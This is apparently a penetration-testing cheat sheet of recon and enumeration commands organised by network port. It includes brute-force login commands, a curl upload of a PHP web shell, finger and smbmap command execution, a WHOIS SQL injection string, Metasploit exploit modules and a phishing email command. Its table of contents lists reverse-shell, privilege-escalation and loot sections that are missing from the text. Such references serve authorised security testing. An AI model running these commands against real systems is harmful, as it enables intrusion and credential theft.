# Pentesting-Exploitation

https://hackviser.com/tactics/pentesting

https://www.hackingarticles.in/penetration-testing/

Pentesting-Exploitation Programs, Commands, Protocols, Network / Ports.

## Table of Contents

- [Recon](#recon)
  - [File Enumeration](#file-enumeration)
  - [Port Reference](#port-reference)
  - [Port 80 - Web Server](#port-80---web-server)
  - [Online Crackers](#online-crackers)
- [Vulnerability Analysis](#vulnerability-analysis)
  - [Buffer Overflow](#buffer-overflow)
  - [Find Exploits](#find-exploits---searchsploit-and-google)
  - [Reverse Shells](#reverse-shells)
- [Privilege Escalation](#privilege-escalation)
  - [Common](#common)
  - [Linux](#linux)
  - [Windows](#windows)
- [Loot](#loot)
  - [Linux](#linux-1)
  - [Windows](#windows-1)
  - [Cloud](#cloud)

---

## Recon

```bash
# Enumerate subnet
nmap -sn 10.10.10.1/24

# Fast simple scan
nmap -sS 10.10.10.1/24

export IP=10.10.10.11

# Extracting live IPs from an nmap scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP

# Autorecon
python3 autorecon.py $IP

# Scan for UDP
nmap $IP -sU
unicornscan -mU -v -I $IP

# Connect to udp if one is open
nc -u $IP 48772

# Responder
responder -I eth0 -A

# Amass
amass enum $IP

# Generate a nice scan report
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "$(date +%m%d%y)_report.html"

# Simple port knocking
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 1.1.1.1; done
```

### File Enumeration

**Common**

```bash
# Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx   # outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx      # inspect
binwalk -e file.xxx   # extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

**Disk files**

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

**Images**

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image it is
identify -verbose image.jpeg
```

**Audio**

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# AudioStego
hideme stego.mp3 -f && cat output.txt
```

### Port Reference

#### Port 7 - Echo (tcp/udp)

```bash
nc -uvn $IP 7
```

Reference: https://en.wikipedia.org/wiki/ECHO_protocol

#### Port 21 - FTP

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP

# Banner grabbing
telnet -vn $IP 21

# Anonymous login
ftp <IP>
> anonymous
> anonymous
> ls -a
> binary
> ascii
> bye

# Browser connection
ftp://anonymous:anonymous@10.10.10.xx

# Download all files
wget -m ftp://anonymous:anonymous@$IP
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

#### Port 22 - SSH

```bash
# Enumeration
nc -vn $IP 22

# Public SSH key of server
ssh-keyscan -t rsa $IP -p <PORT>

# Bruteforce
patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

# Msf
use auxiliary/fuzzers/ssh/ssh_version_2

# SSH user enum (< 7.7)
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt $IP 2>/dev/null | grep "is a"

# Tunneling
ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

References: https://github.com/six2dez/ssh_enum_script | https://www.exploit-db.com/exploits/45233

#### Port 23 - Telnet

```bash
nc -vn $IP 23
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $IP
```

#### Port 25 - SMTP

```bash
# Find MX servers of an organisation
dig +short mx google.com

# smtps
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587

# Enumeration
nmap -p25 --script smtp-commands $IP
nmap --script smtp-enum-users.nse $IP

# Enum users
msf > auxiliary/scanner/smtp/smtp_enum
smtp-user-enum

# Send email from linux console
sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u "Important Upgrade Instructions" -a /tmp/BestComputers-UpgradeInstructions.pdf
```

#### Port 43 - WHOIS

```bash
whois -h $IP -p <PORT> "domain.tld"
echo "domain.ltd" | nc -vn $IP <PORT>

# Possible SQLi via the WHOIS database backend, e.g.:
whois -h 10.10.10.155 -p 43 "a') or 1=1#"
```

#### Port 53 - DNS

```bash
nslookup
> SERVER <IP_DNS>
> 127.0.0.1
> <IP_MACHINE>

# DNS lookups, zone transfers & brute-force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com

# Subdomain brute-force
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt   # https://github.com/rbsec/dnscan
for sub in $(cat subdomains.txt); do host $sub.domain.com | grep "has.address"; done

# Zone transfer for subdomains
dig axfr @$IP hostname.box
dnsenum $IP
dnsrecon -d domain.com -t axfr
```

#### Port 69 - TFTP (UDP)

```bash
nmap -p69 --script=tftp-enum.nse $IP
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IP
msf5> auxiliary/admin/tftp/tftp_transfer_util
```

```python
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```

#### Port 79 - Finger

```bash
nc -vn <IP> 79
echo "root" | nc -vn $IP 79

# User enumeration
finger @$IP
finger admin@$IP
finger user@$IP

# msf
use auxiliary/scanner/finger/finger_users

# Command exec
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

#### Port 88 - Kerberos

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" $IP
msf> use auxiliary/gather/kerberos_enumusers
python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
```

References:
- https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
- https://www.tarlogic.com/blog/como-funciona-kerberos/
- https://www.tarlogic.com/blog/como-atacar-kerberos/

#### Port 110 / 995 - POP3

```bash
# Banner grabbing
telnet $IP
USER admin
PASS admin

nc -nv $IP 110
openssl s_client -connect $IP:995 -crlf -quiet

# Automated
nmap --scripts "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> $IP
```

POP commands:

```
USER uid       Log in as "uid"
PASS password  Password for that user
STAT           Number of messages, mailbox size
LIST           List messages and sizes
RETR n         Show message n
DELE n         Mark message n for deletion
RSET           Undo changes
QUIT           Logout
TOP msg n      Show first n lines of message
CAPA           Get capabilities
```

Reference: http://sunnyoasis.com/services/emailviatelnet.html

#### Port 111 - Rpcbind

```bash
rpcinfo -p $IP
nmap -sSUC -p111 $IP

rpcclient -U "" $IP
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

#### Port 113 - Ident

```bash
# By default (-sC) nmap identifies every user of every running port
```

#### Port 123 - NTP

```bash
nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP

ntpq -c readlist $IP
ntpq -c readvar $IP
ntpq -c monlist $IP
ntpq -c peers $IP
ntpq -c listpeers $IP
ntpq -c associations $IP
ntpq -c sysinfo $IP
```

#### Port 135 - MSRPC

```bash
nmap $IP --script=msrpc-enum
nmap -n -sV -p 135 --script=msrpc-enum $IP

# Msf
use exploit/windows/dcerpc/ms03_026_dcom
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Identifying exposed RPC services
rpcdump [-p port] $IP
rpcdump.py $IP -p 135
```

#### Port 139/445 - SMB

```bash
# Enum hostname
enum4linux -n $IP
nmblookup -A $IP
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP

# Get version
smbver.sh $IP
msfconsole; use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
smbclient -L \\\\$IP

# Get shares
smbmap -H $IP -R <sharename>
echo exit | smbclient -L \\\\
smbclient \\\\$IP\\<share>
smbclient -L //$IP -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP

# Check null sessions
smbmap -H $IP
rpcclient -U "" -N $IP
smbclient //$IP/IPC$ -N

# Exploit null sessions
enum -s $IP
enum -U $IP
enum -P $IP
enum4linux -a $IP
/usr/share/doc/python3-impacket/examples/samrdump.py $IP

# Connect to shares
smbclient //$IP/share -U username           # authenticated
smbclient //$IP/<share> -N                  # anonymous
rpcclient -U " " -N $IP

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn $IP

# Bruteforce login
medusa -h $IP -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $IP -vvvv

# Full nmap smb enum/vuln script set
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $IP

# Mount SMB volume (Linux)
mount -t cifs -o username=user,password=password //$IP/share /mnt/share

# Run cmd over smb from linux
winexe -U username //$IP "cmd.exe" --system

# smbmap examples
smbmap.py -H $IP -u administrator -p asdf1234                       # enum
smbmap.py -u username -p 'Passw0rd!' -d DOMAIN -x 'net group "Domain Admins" /domain' -H $IP   # RCE
smbmap.py -H $IP -u username -p 'Passw0rd!' -L                      # drive listing

# Check for stored creds
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml   # gpp-decrypt
```

#### Port 143 / 993 - IMAP

```bash
nc -nv $IP 143
openssl s_client -connect $IP:993 -quiet
# NTLM auth info disclosure: nmap script imap-ntlm-info.nse
```

#### Port 161/162 UDP - SNMP

```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
snmp-check $IP -c public|private|community
snmpwalk -v 2c -c public $IP
```

#### Port 194 / 6660-7000 - IRC

```bash
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 $IP
```

#### Port 264 - Check Point FireWall-1

```bash
msf > use auxiliary/gather/checkpoint_hostname
msf > set RHOST $IP
```

Reference: https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264

#### LDAP - 389, 636, 3268, 3269

```bash
# Basic enumeration
nmap -n -sV --script "ldap* and not brute" $IP

# Clear text creds may be sniffable if LDAP is used without SSL
ldapsearch -h $IP -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h $IP -D 'DOMAIN\user' -w 'hash-password'
ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'
ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<SUBDOMAIN>,DC=<TLD>"

# Brute-force
patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```

GUI: http://www.jxplorer.org/downloads/users.html

#### HTTPS - 443

Read the SSL cert to find potential vhosts, clock skew, and possible usernames.

```bash
sslscan $IP:443
nmap -sV --script=ssl-heartbleed $IP
```

#### Port 500 - ISAKMP IPsec/IKE VPN

```bash
nmap -sU -p 500
ike-scan $IP
ike-scan -M $IP
```

The `AUTH` field with value `PSK` means a pre-shared key is used (good for a pentester).

- `0 handshake / 0 notify` → not an IPsec gateway
- `1 handshake / 0 notify` → IKE negotiation possible, at least one transform accepted
- `0 handshake / 1 notify` → no transform accepted; try more transforms

```bash
# Generate transform list
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt; done; done; done; done

# Brute force each transform
while read line; do (echo "Valid trans found: $line" && ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found"; done < ike-dict.txt
```

References: pskattack.pdf (ernw.de) | securityfocus.com/infocus/1821 | radarhack.com IKE scan paper

#### Port 502 - Modbus

```bash
nmap --script modbus-discover -p 502 $IP
msf> use auxiliary/scanner/scada/modbusdetect
msf> use auxiliary/scanner/scada/modbus_findunitid
```

#### Port 512 - Rexec / Port 513 - Rlogin / Port 514 - RSH

```bash
# Rlogin
apt install rsh-client
rlogin -l <USER> $IP

# RSH
rsh $IP <Command>
rsh $IP -l domain\user <Command>
rsh domain/user@$IP <Command>
```

#### Port 515 - LPD (line printer daemon)

```bash
# lpdprint (part of PRET) prints directly to an LPD-capable printer
lpdprint.py hostname filename
```

Reference: https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856

#### Port 541 - FortiNet SSLVPN

No public tooling notes.

#### Port 548 - Apple Filing Protocol (AFP)

```bash
msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script "afp-* and not dos and not brute" -p <PORT> $IP
```

#### Port 554 - RTSP

Basic auth is base64(`<username>:<password>`).

```bash
DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n
```

```python
import socket
req = "DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 554))
s.sendall(req)
data = s.recv(4096)
print(data)
```

```bash
nmap -sV --scripts "rtsp-*" -p 554 $IP
```

Bruteforce: https://github.com/Tek-Security-Group/rtsp_authgrinder

#### Port 623 - IPMI

```bash
nmap -n -p 623 10.0.0.0/24
nmap -n -sU -p 623 10.0.0.0/24
msf > use auxiliary/scanner/ipmi/ipmi_version
```

#### Port 631 - Internet Printing Protocol (IPP)

Defined in RFC2910/RFC2911. Based on HTTP (POST to port 631/tcp), so it inherits basic/digest auth and SSL/TLS. CUPS is a common implementation; IPP can be abused as a carrier for malicious PostScript/PJL files.

#### Port 873 - Rsync

```bash
nc -vn 127.0.0.1 873
# @RSYNCD: 31.0  -> reply with same version -> "list" to enumerate modules

nmap -sV --script "rsync-list-modules" -p 873 $IP
msf> use auxiliary/scanner/rsync/modules_list

rsync -av --list-only rsync://$IP/shared_name
rsync -av --list-only rsync://[$IP-V6]:8730   # IPv6 + custom port
```

#### Port 1026 - Rusersd

```bash
apt-get install rusers
rusers -l $IP
```

#### Port 1028 / 1099 - Java RMI

```bash
msf > use auxiliary/scanner/misc/java_rmi_server
msf > use auxiliary/gather/java_rmi_registry
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1028 $IP

# Reverse shell
msf > use exploit/multi/browser/java_rmi_connection_impl
```

#### Port 1030/1032/1033/1038

Used by RPC to connect in a domain network.

#### Port 1433 - MSSQL

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP

msf> use auxiliary/scanner/mssql/mssql_ping
nmap -p 1433 -sU --script=ms-sql-info.nse $IP

sqsh -S $IP -U <Username> -P <Password> -D <Database>
sqsh -S $IP -U sa
    xp_cmdshell 'date'
    go

# msfconsole (set USERNAME, RHOSTS, PASSWORD, DOMAIN/USE_WINDOWS_AUTHENT as needed)
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer         # steal NTLM (run Responder first)
msf> use admin/mssql/mssql_enum                           # security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as
msf> use admin/mssql/mssql_escalate_dbowner
msf> use admin/mssql/mssql_exec
msf> use exploit/windows/mssql/mssql_payload
msf> use windows/manage/mssql_local_auth_bypass
```

#### Port 1521 - Oracle

```bash
oscanner -s $IP -P 1521
tnscmd10g version -h $IP
tnscmd10g status -h $IP
nmap -p 1521 -A $IP
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute

# Msf
use auxiliary/admin/oracle
use auxiliary/scanner/oracle
```

#### Port 1723 - PPTP

```bash
nmap -Pn -sSV -p1723 $IP
```

#### Port 1883 - MQTT (Mosquitto)

Client: https://github.com/bapowell/python-mqtt-client-shell

```
> connect          # configure host:port first, default 127.0.0.1:1883
> subscribe "#" 1
> subscribe "$SYS/#"
```

```python
import paho.mqtt.client as mqtt

HOST, PORT = "127.0.0.1", 1883

def on_connect(client, userdata, flags, rc):
    client.subscribe('#', qos=1)
    client.subscribe('$SYS/#')

def on_message(client, userdata, message):
    print('Topic: %s | QOS: %s | Message: %s' % (message.topic, message.qos, message.payload))

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
```

#### Port 2049 - NFS

```bash
# nmap scripts
nfs-ls          # list exports and permissions
nfs-showmount    # like showmount -e
nfs-statfs       # disk stats

# msf
scanner/nfs/nfsmount

# Mounting
showmount -e $IP
mount -t nfs [-o vers=2] $IP:<remote_folder> <local_folder> -o nolock
```

#### Port 2100 - Oracle XML DB

```bash
# FTP default creds
sys:sys
scott:tiger
```

Password list: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

#### Port 3260 - iSCSI

```bash
nmap -sV --script=iscsi-info -p 3260 $IP

sudo apt-get install open-iscsi
iscsiadm -m discovery -t sendtargets -p $IP:3260
iscsiadm -m node --targetname="<target>" -p $IP:3260 --login
iscsiadm -m node --targetname="<target>" -p $IP:3260 --logout
```

#### Port 3299 - SAPRouter

```bash
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS $IP
msf auxiliary(sap_service_discovery) > run
msf > use auxiliary/scanner/sap/sap_router_info_request
```

Reference: https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/

#### Port 3306 - MySQL

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP

msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump
msf> use auxiliary/admin/mysql/mysql_enum
msf> use auxiliary/scanner/mysql/mysql_schemadump
msf> use exploit/windows/mysql/mysql_start_up

mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

#### Port 3339 - Oracle Web Interface

Basic info about the underlying web service (Apache, nginx, IIS).

#### Port 3389 - RDP

```bash
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP

# Connect with known credentials/hash
rdesktop -u <username> $IP
rdesktop -d <domain> -u <username> -p <password> $IP
xfreerdp /u:[domain\]<username> /p:<password> /v:$IP
xfreerdp /u:[domain\]<username> /pth:<hash> /v:$IP

# Check known credentials
rdp_check <domain>\<name>:<password>@$IP

# Launch cmd with other credentials for network use
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe"
```

Post-exploitation: https://github.com/JoelGMSec/AutoRDPwn

#### Port 3632 - distcc

References:
- https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec
- https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855

#### Port 4369 - Erlang Port Mapper Daemon (epmd)

```bash
echo -n -e "\x00\x01\x6e" | nc -vn $IP 4369

# Via Erlang
apt-get install erlang
erl
1> net_adm:names('<HOST>').

# Automatic
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info $IP
```

#### Port 5353 UDP - mDNS

```bash
nmap -Pn -sUC -p5353 $IP
```

#### Port 5432 / 5433 - PostgreSQL

```bash
psql -U <myuser>
psql -h $IP -U <username> -d <database>
psql -h $IP -p <port> -U <username> -W <password> <database>

\list
\c <database>
\d
CREATE TABLE demo(t text);
COPY demo from '[FILENAME]';
SELECT * FROM demo;

msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

#### Port 5671 - AMQP

```python
import amqp
# Default creds "guest":"guest"
conn = amqp.connection.Connection(host="<IP>", port=5672, virtual_host="/")
conn.connect()
for k, v in conn.server_properties.items():
    print(k, v)
```

```bash
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info $IP
```

#### Port 5800/5801/5900/5901 - VNC

```bash
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> $IP
msf> use auxiliary/scanner/vnc/vnc_none_auth

# Connect
vncviewer [-passwd passwd.txt] $IP::5901
```

#### Port 5984 - CouchDB

```bash
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 $IP
msf> use auxiliary/scanner/couchdb/couchdb_enum
curl http://$IP:5984/
```

Reference: https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html

#### Port 5985 / 5986 - WinRM

```bash
gem install evil-winrm
evil-winrm -i $IP -u Administrator -p 'password1'
evil-winrm -i $IP -u Administrator -H 'hash-pass'

# Msf
msf > use auxiliary/scanner/winrm/winrm_login
msf > use auxiliary/scanner/winrm/winrm_cmd
msf > use exploit/windows/winrm/winrm_script_exec
```

Manual PowerShell/Ruby WinRM shell reference: https://alamot.github.io/winrm_shell/

#### Port 6000 - X11

```bash
nmap -sV --script x11-access -p 6000 $IP
msf> use auxiliary/scanner/x11/open_x11
msf> use exploit/unix/x11/x11_keyboard_exec
```

Reference: https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/

#### Port 6379 - Redis

```bash
nmap --script redis-info -sV -p 6379 $IP
msf> use auxiliary/scanner/redis/redis_server

sudo apt-get install redis-tools
redis-cli -h $IP
> info
> CONFIG GET *
> keys *
> get <key_from_keys_list>
```

Reference/tool: https://github.com/Avinash-acid/Redis-Server-Exploit

#### Port 8009 - Apache JServ Protocol (AJP)

```bash
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP
```

Reference: https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/

#### Port 8172 - MsDeploy (Microsoft IIS Deploy)

```
$IP:8172/msdeploy.axd
```

#### WebDAV

```bash
davtest -cleanup -url http://$IP
cadaver http://$IP
```

#### Port 9042 / 9160 - Cassandra

```bash
pip install cqlsh
cqlsh $IP

SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
SELECT keyspace_name FROM system.schema_keyspaces;
desc <Keyspace_name>
desc system_auth
SELECT * from system_auth.roles;
SELECT * from logdb.user_auth;
SELECT * from logdb.user;
SELECT * from configuration."config";

nmap -sV --script cassandra-info -p 9042,9160 $IP
```

#### Port 9100 - Raw Printing (JetDirect/AppSocket/PDL)

```bash
nmap -sV --script pjl-ready-message -p <PORT> $IP
msf> use auxiliary/scanner/printer/printer_env_vars
msf> use auxiliary/scanner/printer/printer_list_dir
msf> use auxiliary/scanner/printer/printer_list_volumes
msf> use auxiliary/scanner/printer/printer_ready_message
msf> use auxiliary/scanner/printer/printer_version_info
msf> use auxiliary/scanner/printer/printer_download_file
msf> use auxiliary/scanner/printer/printer_upload_file
msf> use auxiliary/scanner/printer/printer_delete_file
```

Tool: https://github.com/RUB-NDS/PRET

#### Port 9200 - Elasticsearch

```bash
firefox http://$IP:9200/
# List indices: http://$IP:9200/_cat/indices?v
```

Reference: https://www.elastic.co/what-is/elasticsearch

#### Port 10000 - NDMP

```bash
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 $IP
```

#### Port 11211 - Memcache

To exfiltrate data: find active slabs → get key names → dump each key.

```bash
echo "version" | nc -vn $IP 11211
echo "stats" | nc -vn $IP 11211
echo "stats slabs" | nc -vn $IP 11211
echo "stats items" | nc -vn $IP 11211
echo "stats cachedump <number> 0" | nc -vn $IP 11211
echo "get <item_name>" | nc -vn $IP 11211

# PHP dump of keys
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump($c->getAllKeys());'

# Automatic
nmap -n -sV --script memcached-info -p 11211 $IP
msf > use auxiliary/gather/memcached_extractor
msf > use auxiliary/scanner/memcached/memcached_amp
```

#### Port 15672 - RabbitMQ Management

Default creds: `guest`:`guest`

```bash
rabbitmq-plugins enable rabbitmq_management
service rabbitmq-server restart
```

Reference: https://www.rabbitmq.com/management.html

#### Port 27017 / 27018 - MongoDB

```python
from pymongo import MongoClient
client = MongoClient(host, port, username=username, password=password)
client.server_info()
admin = client.admin
admin_info = admin.command("serverStatus")
for db in client.list_databases():
    print(db)
    print(client[db["name"]].list_collection_names())
```

```bash
show dbs
use <db>
show collections
db.<collection>.find()
db.<collection>.count()
db.current.find({"username":"admin"})

nmap -sV --script "mongo* and default" -p 27017 $IP
nmap -n -sV --script mongodb-brute -p 27017 $IP

mongo $IP
mongo $IP:<PORT>
mongo $IP:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'

# Check if auth is needed
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"
grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth"
```

#### Port 44818 - EtherNet/IP

```bash
nmap -n -sV --script enip-info -p 44818 $IP
pip3 install cpppo
python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a $IP
```

Reference: https://en.wikipedia.org/wiki/EtherNet/IP

#### Port 47808 UDP - BACnet

```bash
pip3 install BAC0
```

```python
import BAC0
bbmdIP = '$IP:47808'
bbmdTTL = 900
bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL)
bacnet.vendorName.strValue
```

```bash
nmap --script bacnet-info --script-args full=yes -sU -n -sV -p 47808 $IP
```

#### Port 50030/50060/50070/50075/50090 - Hadoop

Apache Hadoop is a framework for distributed storage (HDFS) and processing (MapReduce/YARN) of large datasets.

#### Unknown Ports

```bash
amap -d $IP 8000
nc -nv $IP 110
```

### Port 80 - Web Server

Check `robots.txt`, `sitemap.xml`, headers, and source code.

```bash
# Server version fingerprinting
whatweb -a 1 <URL>    # stealthy
whatweb -a 3 <URL>    # aggressive
webtech -u <URL>

nikto -h http://$IP

# CMS
cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]

# WPScan
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp
wpscan --url http://$IP --enumerate vt
wpscan --url http://$IP --enumerate u

# Enumerate WP users
for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done

# Joomscan
joomscan -u http://$IP
joomscan -u http://$IP --enumerate-components

# Curl basics
curl -i $IP
curl -i -X OPTIONS $IP
curl -i -L $IP
curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
curl $IP -s -L | html2text -width '99' | uniq

# Upload check
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php

# POST login data
curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
curl -s http://$IP/fileRead.php -d 'file=fileRead.php' | jq -r ."file"

# Google dork
site:domain.com intext:user
```

Dorks: https://github.com/sushiwushi/bug-bounty-dorks

**URL Brute-force**

```bash
ffuf -c -e '.htm','.php','.html' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://$IP/FUZZ

dirb http://$IP -r -o dirb-$IP.txt

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://$IP/FUZZ

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt -x php -e

